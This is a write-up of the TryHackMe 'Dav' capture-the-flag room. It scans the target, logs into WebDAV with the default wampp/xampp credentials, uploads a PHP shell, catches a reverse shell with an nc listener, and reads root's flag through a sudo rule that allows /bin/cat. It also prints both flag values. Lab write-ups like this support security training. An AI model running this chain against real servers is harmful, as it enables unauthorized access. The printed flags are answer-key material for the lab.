---
title: "Tryhackme - Dav WriteUp"
date: 2020-10-21
tags: [tryhackme, walkthrough, linux]
header:
  image: "/images/not-found.gif"
excerpt: "Walkthroughs"
---


# TryHackMe - Dav WriteUp

**Keywords**: webdav, cadaver, cat priv. esc., sudoers priv. esc.

## Information Gathering


### nmap

```
root@kali:~/TryHackMe# nmap -sV -p 80 --script vuln 10.10.70.119
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
...

```

### gobuster

```
root@kali:~/TryHackMe# gobuster dir -u http://10.10.70.119/ -w /usr/share/wordlists/dirb/common.txt -x .php,.html,.txt
...
/webdav (Status: 401)
```


## Enumeration

Webdav default credentials: http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html

- The WebDAV plugin for the Apache server included with XAMPP version 1.7.3 or lower is enabled by default
- user: wampp
- pass: xampp

**Login to the XAMPP server's WebDAV folder**:

```
cadevar http://$IP/webdav/
```

_cadaver - A command-line WebDAV client for Unix._

**Upload a file to XAMPP server's WebDAV folder**:

```
put /file/
```

**Browse a file in XAMPP server's WebDAV folder**:

```
load http://$IP/webdav/file
```

### cadaver

```
root@kali:~/TryHackMe# cadaver http://10.10.70.119/webdav
Authentication required for webdav on server `10.10.70.119':
Username: wampp
Password: xampp
dav:/webdav/> 
```


## Exploit

```
dav:/webdav/> put shell.php 
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 5493 bytes succeeded.
dav:/webdav/> 
```

```
root@kali:~/TryHackMe# nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.11.19.26] from (UNKNOWN) [10.10.70.119] 39456
...
$ python -c "import pty; pty.spawn('/bin/bash')"
www-data@ubuntu:/$ 
```

## Privilege Escalation


**user.txt**

```
www-data@ubuntu:/$ cd /home/
www-data@ubuntu:/home$ ls
merlin  wampp
www-data@ubuntu:/home$ cd merlin
www-data@ubuntu:/home/merlin$ ls -la
ls -la
total 44
drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
-rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
-rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
-rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
-rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
-rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
-rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt
www-data@ubuntu:/home/merlin$ cat user.txt
cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
```

**root.txt**

```
www-data@ubuntu:/home/merlin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/home/merlin$ sudo /bin/cat /root/root.txt
sudo /bin/cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```